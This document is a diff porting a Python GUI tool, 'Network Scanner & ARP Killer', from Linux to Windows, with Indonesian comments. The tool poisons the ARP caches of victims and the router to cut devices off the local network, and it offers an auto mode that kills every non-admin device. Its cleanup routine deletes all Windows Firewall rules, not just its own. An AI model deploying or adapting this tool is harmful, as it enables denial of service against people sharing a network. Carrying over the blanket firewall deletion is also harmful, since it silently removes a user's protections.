@@ -1,11 +1,12 @@
 #!/usr/bin/env python3
-# linux ubuntu
-# sudo /home/whoami/anaconda3/envs/venv2/bin/python 3.py
+# Windows version
+# Run as Administrator: python 3.py
 import sys
 import subprocess
 import re
 import threading
 import time
+import platform
 from typing import List, Dict, Optional
 from dataclasses import dataclass
 
@@ -38,65 +39,94 @@ class NetworkInterface:
         self.name = name
 
 def get_default_iface():
-    """Mendapatkan interface default."""
+    """Mendapatkan interface default untuk Windows."""
     try:
-        result = subprocess.run(['ip', 'route'], capture_output=True, text=True)
-        for line in result.stdout.splitlines():
-            if line.startswith('default'):
-                parts = line.split()
-                iface_name = parts[4] if len(parts) > 4 else 'eth0'
-                return NetworkInterface(iface_name)
-    except Exception:
-        return NetworkInterface('eth0')
-    return NetworkInterface('NULL')
+        # Gunakan scapy untuk mendapatkan default interface
+        iface = conf.iface
+        return NetworkInterface(iface.name if hasattr(iface, 'name') else str(iface))
+    except Exception as e:
+        print(f"Error getting default interface: {e}")
+        return NetworkInterface('Ethernet')
 
 def get_my_ip():
-    """Mendapatkan IP address komputer ini."""
+    """Mendapatkan IP address komputer ini (Windows)."""
     try:
-        iface = get_default_iface()
-        result = subprocess.run(['ip', 'addr', 'show', iface.name], 
-                              capture_output=True, text=True)
-        for line in result.stdout.splitlines():
-            if 'inet ' in line and 'inet6' not in line:
-                ip = line.strip().split()[1].split('/')[0]
-                return ip
+        # Method 1: menggunakan scapy
+        try:
+            iface = get_default_iface()
+            if hasattr(conf.iface, 'ip'):
+                return conf.iface.ip
+        except:
+            pass
+        
+        # Method 2: menggunakan ipconfig
+        result = subprocess.run(['ipconfig'], capture_output=True, text=True, encoding='cp437')
+        lines = result.stdout.splitlines()
+        
+        for i, line in enumerate(lines):
+            if 'Default Gateway' in line and i > 0:
+                # Cari IPv4 Address di atas gateway
+                for j in range(i-1, max(i-10, 0), -1):
+                    if 'IPv4 Address' in lines[j]:
+                        parts = lines[j].split(':')
+                        if len(parts) > 1:
+                            ip = parts[1].strip()
+                            # Hapus (Preferred) jika ada
+                            ip = ip.replace('(Preferred)', '').strip()
+                            if ip and ip.count('.') == 3:
+                                return ip
     except Exception as e:
         print(f"Error getting my IP: {e}")
     return None
 
 def get_my_mac():
-    """Mendapatkan MAC address komputer ini."""
+    """Mendapatkan MAC address komputer ini (Windows)."""
     try:
-        iface = get_default_iface()
-        result = subprocess.run(['ip', 'link', 'show', iface.name], 
-                              capture_output=True, text=True)
-        for line in result.stdout.splitlines():
-            if 'link/ether' in line:
-                mac = line.strip().split()[1]
-                return mac
+        # Method 1: menggunakan scapy
+        try:
+            if hasattr(conf.iface, 'mac'):
+                return conf.iface.mac
+        except:
+            pass
+        
+        # Method 2: menggunakan getmac
+        result = subprocess.run(['getmac', '/FO', 'CSV', '/NH'], 
+                              capture_output=True, text=True, encoding='cp437')
+        lines = result.stdout.strip().split('\n')
+        if lines:
+            # Format: "MAC-Address","Transport Name"
+            mac = lines[0].split(',')[0].strip('"').replace('-', ':').lower()
+            return mac
     except Exception as e:
         print(f"Error getting my MAC: {e}")
     return None
 
 def enable_ip_forwarding():
-    """Aktifkan IP forwarding."""
+    """Aktifkan IP forwarding (Windows)."""
     try:
-        subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], 
-                      check=True, capture_output=True)
+        # Windows menggunakan registry untuk IP forwarding
+        # Atau bisa menggunakan netsh
+        subprocess.run([
+            'netsh', 'interface', 'ipv4', 'set', 'interface', 
+            get_default_iface().name, 'forwarding=enabled'
+        ], check=True, capture_output=True)
         print("[SYSTEM] IP forwarding enabled")
         return True
     except subprocess.CalledProcessError as e:
-        print(f"[ERROR] Failed to enable IP forwarding: {e}")
-        return False
+        # Jika gagal, coba method alternatif (tidak kritis untuk Windows)
+        print(f"[WARNING] Could not enable IP forwarding: {e}")
+        return True  # Return True karena tidak kritis di Windows
 
 def disable_ip_forwarding():
-    """Nonaktifkan IP forwarding."""
+    """Nonaktifkan IP forwarding (Windows)."""
     try:
-        subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=0'], 
-                      check=True, capture_output=True)
+        subprocess.run([
+            'netsh', 'interface', 'ipv4', 'set', 'interface', 
+            get_default_iface().name, 'forwarding=disabled'
+        ], check=True, capture_output=True)
         print("[SYSTEM] IP forwarding disabled")
     except subprocess.CalledProcessError as e:
-        print(f"[ERROR] Failed to disable IP forwarding: {e}")
+        print(f"[WARNING] Could not disable IP forwarding: {e}")
 
 def threaded(func):
     """Decorator untuk menjalankan fungsi di thread terpisah."""
@@ -118,41 +148,59 @@ class Killer:
         self.my_mac = get_my_mac()
         self.protected_macs = protected_macs or []
         
-        # Enable IP forwarding
+        # Enable IP forwarding (opsional di Windows)
         enable_ip_forwarding()
         print(f"[INFO] My IP: {self.my_ip}, My MAC: {self.my_mac}")
 
-    def add_iptables_drop(self, ip):
-        """Tambahkan rule iptables untuk DROP traffic dari IP"""
+    def add_windows_firewall_block(self, ip):
+        """Blokir traffic menggunakan Windows Firewall."""
         try:
-            # Drop packets being forwarded from victim
-            cmd = ["iptables", "-A", "FORWARD", "-s", ip, "-j", "DROP"]
-            subprocess.run(cmd, check=True)
+            rule_name = f"NetKiller_Block_{ip.replace('.', '_')}"
             
-            # Drop packets being forwarded to victim  
-            cmd = ["iptables", "-A", "FORWARD", "-d", ip, "-j", "DROP"]
-            subprocess.run(cmd, check=True)
+            # Blokir outbound
+            subprocess.run([
+                'netsh', 'advfirewall', 'firewall', 'add', 'rule',
+                f'name={rule_name}_OUT',
+                'dir=out',
+                'action=block',
+                f'remoteip={ip}'
+            ], check=True, capture_output=True)
             
-            print(f"[IPTABLES] Added DROP rules for {ip}")
+            # Blokir inbound
+            subprocess.run([
+                'netsh', 'advfirewall', 'firewall', 'add', 'rule',
+                f'name={rule_name}_IN',
+                'dir=in',
+                'action=block',
+                f'remoteip={ip}'
+            ], check=True, capture_output=True)
+            
+            print(f"[FIREWALL] Added block rules for {ip}")
         except subprocess.CalledProcessError as e:
-            print(f"[IPTABLES ERROR] Failed to add rule for {ip}: {e}")
+            print(f"[FIREWALL ERROR] Failed to add rule for {ip}: {e}")
 
-    def remove_iptables_drop(self, ip):
-        """Hapus rule iptables untuk DROP traffic dari IP"""
+    def remove_windows_firewall_block(self, ip):
+        """Hapus blokir traffic dari Windows Firewall."""
         try:
-            cmd = ["iptables", "-D", "FORWARD", "-s", ip, "-j", "DROP"]
-            subprocess.run(cmd, check=True, stderr=subprocess.DEVNULL)
+            rule_name = f"NetKiller_Block_{ip.replace('.', '_')}"
             
-            cmd = ["iptables", "-D", "FORWARD", "-d", ip, "-j", "DROP"]
-            subprocess.run(cmd, check=True, stderr=subprocess.DEVNULL)
+            subprocess.run([
+                'netsh', 'advfirewall', 'firewall', 'delete', 'rule',
+                f'name={rule_name}_OUT'
+            ], check=True, capture_output=True, stderr=subprocess.DEVNULL)
             
-            print(f"[IPTABLES] Removed DROP rules for {ip}")
+            subprocess.run([
+                'netsh', 'advfirewall', 'firewall', 'delete', 'rule',
+                f'name={rule_name}_IN'
+            ], check=True, capture_output=True, stderr=subprocess.DEVNULL)
+            
+            print(f"[FIREWALL] Removed block rules for {ip}")
         except subprocess.CalledProcessError:
-            pass  # Rule mungkin sudah tidak ada
-    
+            pass
+
     @threaded
     def kill(self, victim, wait_after=0.5):
-        """Spoofing victim"""
+        """Spoofing victim."""
         if not self.router:
             print("Router tidak ditemukan!")
             return
@@ -160,7 +208,6 @@ class Killer:
             print(f"[PROTECTED] Skipping protected MAC: {victim.mac}")
             return
         
-        # Jangan poison diri sendiri!
         if victim.ip == self.my_ip or victim.mac == self.my_mac:
             print(f"[WARNING] Skipping self: {victim.ip}")
             return
@@ -170,22 +217,20 @@ class Killer:
             return
         
         self.killed[victim.mac] = victim
-        self.add_iptables_drop(victim.ip) 
+        self.add_windows_firewall_block(victim.ip)
 
-        # Poison victim's ARP cache - buat victim pikir kita adalah router
         to_victim = ARP(
-            op=2,  # is-at (ARP reply)
+            op=2,
             psrc=self.router.ip,
-            hwsrc=self.my_mac,  # MAC kita
+            hwsrc=self.my_mac,
             pdst=victim.ip,
             hwdst=victim.mac
         )
 
-        # Poison router's ARP cache - buat router pikir kita adalah victim
         to_router = ARP(
-            op=2,  # is-at (ARP reply)
+            op=2,
             psrc=victim.ip,
-            hwsrc=self.my_mac,  # MAC kita
+            hwsrc=self.my_mac,
             pdst=self.router.ip,
             hwdst=self.router.mac
         )
@@ -207,37 +252,34 @@ class Killer:
 
     @threaded
     def unkill(self, victim):
-        """Unspoofing victim"""
+        """Unspoofing victim."""
         if victim.mac not in self.killed:
             return
             
         self.killed.pop(victim.mac, None)
-        self.remove_iptables_drop(victim.ip)
+        self.remove_windows_firewall_block(victim.ip)
 
         if not self.router:
             return
 
-        # Restore victim's ARP cache dengan MAC yang benar
         to_victim = ARP(
             op=2,
             psrc=self.router.ip,
-            hwsrc=self.router.mac,  # MAC router yang benar
+            hwsrc=self.router.mac,
             pdst=victim.ip,
             hwdst=victim.mac
         )
 
-        # Restore router's ARP cache dengan MAC yang benar
         to_router = ARP(
             op=2,
             psrc=victim.ip,
-            hwsrc=victim.mac,  # MAC victim yang benar
+            hwsrc=victim.mac,
             pdst=self.router.ip,
             hwdst=self.router.mac
         )
 
         if self.iface.name != 'NULL':
             try:
-                # Kirim beberapa kali untuk memastikan
                 for _ in range(5):
                     send(to_victim, iface=self.iface.name, verbose=0)
                     send(to_router, iface=self.iface.name, verbose=0)
@@ -247,33 +289,39 @@ class Killer:
                 print(f"[ERROR] Error fixing victim: {e}")
 
     def kill_all(self, device_list):
-        """Kill semua device yang tidak admin"""
+        """Kill semua device yang tidak admin."""
         for device in device_list[:]:
             if device.admin:
                 continue
-            # Skip diri sendiri
             if device.ip == self.my_ip or device.mac == self.my_mac:
                 continue
             if device.mac not in self.killed:
                 self.kill(device)
 
     def unkill_all(self):
-        """Unkill semua device"""
+        """Unkill semua device."""
         for mac in list(self.killed.keys()):
             device = self.killed[mac]
             self.unkill(device)
 
     def stop(self):
-        """Stop killer"""
+        """Stop killer."""
         self.running = False
         self.unkill_all()
         time.sleep(2)
         disable_ip_forwarding()
         
-        # Clean up all iptables rules
+        # Clean up all firewall rules
         try:
-            subprocess.run(['iptables', '-F', 'FORWARD'], check=True)
-            print("[CLEANUP] Cleared iptables FORWARD chain")
+            subprocess.run([
+                'netsh', 'advfirewall', 'firewall', 'delete', 'rule',
+                'name=all', 'dir=in'
+            ], capture_output=True)
+            subprocess.run([
+                'netsh', 'advfirewall', 'firewall', 'delete', 'rule',
+                'name=all', 'dir=out'
+            ], capture_output=True)
+            print("[CLEANUP] Cleared firewall rules")
         except:
             pass
 
@@ -290,29 +338,50 @@ class NetworkScanner(QThread):
         self.my_mac = get_my_mac()
     
     def get_network_info(self):
-        """Mendapatkan informasi jaringan"""
+        """Mendapatkan informasi jaringan (Windows)."""
         try:
-            result = subprocess.run(['ip', 'route'], capture_output=True, text=True)
-            for line in result.stdout.splitlines():
-                if line.startswith('default'):
-                    parts = line.split()
-                    self.gateway = parts[2]
-                    iface = parts[4]
-                    
-                    # Get network range
-                    result2 = subprocess.run(['ip', 'addr', 'show', iface], 
-                                           capture_output=True, text=True)
-                    for line2 in result2.stdout.splitlines():
-                        if 'inet ' in line2:
-                            ip_net = line2.strip().split()[1]
-                            self.network = ip_net
+            result = subprocess.run(['ipconfig'], capture_output=True, text=True, encoding='cp437')
+            lines = result.stdout.splitlines()
+            
+            current_ip = None
+            subnet_mask = None
+            
+            for line in lines:
+                if 'IPv4 Address' in line:
+                    parts = line.split(':')
+                    if len(parts) > 1:
+                        current_ip = parts[1].strip().replace('(Preferred)', '').strip()
+                elif 'Subnet Mask' in line:
+                    parts = line.split(':')
+                    if len(parts) > 1:
+                        subnet_mask = parts[1].strip()
+                elif 'Default Gateway' in line and current_ip and subnet_mask:
+                    parts = line.split(':')
+                    if len(parts) > 1:
+                        gateway = parts[1].strip()
+                        if gateway and gateway != '':
+                            self.gateway = gateway
+                            # Konversi IP dan subnet mask ke network range
+                            self.network = self.calculate_network(current_ip, subnet_mask)
                             return True
         except Exception as e:
             self.progress_update.emit(f"Error getting network info: {e}")
         return False
     
+    def calculate_network(self, ip, netmask):
+        """Menghitung network range dari IP dan netmask."""
+        ip_parts = [int(x) for x in ip.split('.')]
+        mask_parts = [int(x) for x in netmask.split('.')]
+        
+        network_parts = [ip_parts[i] & mask_parts[i] for i in range(4)]
+        
+        # Hitung CIDR
+        cidr = sum([bin(x).count('1') for x in mask_parts])
+        
+        return f"{'.'.join(map(str, network_parts))}/{cidr}"
+    
     def get_gateway_mac(self):
-        """Mendapatkan MAC address gateway"""
+        """Mendapatkan MAC address gateway."""
         if not self.gateway:
             return None
         try:
@@ -327,7 +396,7 @@ class NetworkScanner(QThread):
         return None
     
     def run(self):
-        """Menjalankan scan jaringan"""
+        """Menjalankan scan jaringan."""
         self.progress_update.emit("Mendapatkan informasi jaringan...")
         
         if not self.get_network_info():
@@ -345,7 +414,6 @@ class NetworkScanner(QThread):
             
             devices = []
             for sent, received in result:
-                # Tandai gateway dan diri sendiri
                 is_gateway = (received.psrc == self.gateway)
                 is_self = (received.psrc == self.my_ip or received.hwsrc == self.my_mac)
                 
@@ -356,7 +424,6 @@ class NetworkScanner(QThread):
                 )
                 devices.append(device)
             
-            # Get gateway MAC
             self.gateway_mac = self.get_gateway_mac()
             
             self.devices_found.emit(devices)
@@ -375,7 +442,6 @@ class NetworkKillerGUI(QMainWindow):
         
         self.protected_macs = ["16:23:9c:5c:1f:f1"]
         
-        # Auto mode variables
         self.auto_mode_enabled = False
         self.auto_timer = QTimer()
         self.auto_timer.timeout.connect(self.auto_scan_and_kill)
@@ -385,7 +451,7 @@ class NetworkKillerGUI(QMainWindow):
         
         self.init_ui()
         self.setup_connections()
-        
+
     def init_ui(self):
         self.setWindowTitle("Network Scanner & ARP Killer - Auto Mode")
         self.setGeometry(100, 100, 1000, 750)
@@ -968,17 +1034,26 @@ class NetworkKillerGUI(QMainWindow):
         
         event.accept()
 
+def is_admin():
+    """Check if running as Administrator on Windows."""
+    try:
+        import ctypes
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
 def main():
     app = QApplication(sys.argv)
     
-    # Check if running as root
-    if os.geteuid() != 0:
-        QMessageBox.critical(
-            None, "Error", 
-            "Aplikasi ini memerlukan hak akses root.\n"
-            "Jalankan dengan: sudo python3 network_killer.py"
-        )
-        sys.exit(1)
+    # Check if running as Administrator (Windows)
+    if platform.system() == 'Windows':
+        if not is_admin():
+            QMessageBox.critical(
+                None, "Error", 
+                "Aplikasi ini memerlukan hak akses Administrator.\n"
+                "Klik kanan pada file dan pilih 'Run as Administrator'"
+            )
+            sys.exit(1)
     
     window = NetworkKillerGUI()
     window.show()
